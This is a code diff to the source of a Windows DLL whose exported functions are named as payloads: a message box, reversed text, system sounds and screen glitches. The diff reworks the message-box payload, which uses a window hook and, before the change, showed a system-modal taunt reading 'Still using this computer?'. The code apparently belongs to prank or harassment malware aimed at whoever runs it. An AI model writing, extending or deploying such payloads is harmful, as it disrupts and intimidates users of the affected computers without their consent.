@@ -3,11 +3,10 @@
 #define PAYLOAD extern "C" __declspec(dllexport) void
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD reason, LPVOID unused);
-DWORD WINAPI messageBoxThread(LPVOID parameter);
 LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam);
 BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
 
-PAYLOAD payloadMessageBox();
+PAYLOAD payloadMessageBox(LPWSTR text, LPWSTR label, int style);
 PAYLOAD payloadReverseText();
 PAYLOAD payloadSound();
 PAYLOAD payloadGlitch();
@@ -29,16 +28,10 @@ const char *sounds[] = {
 	"SystemExclamation"
 };
 
-PAYLOAD payloadMessageBox() {
-	CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
-}
-
-DWORD WINAPI messageBoxThread(LPVOID parameter) {
+PAYLOAD payloadMessageBox(LPWSTR text, LPWSTR label, int style) {
 	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
-	MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
+	MessageBoxW(NULL, text, label, style);
 	UnhookWindowsHookEx(hook);
-
-	return 0;
 }
 
 LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
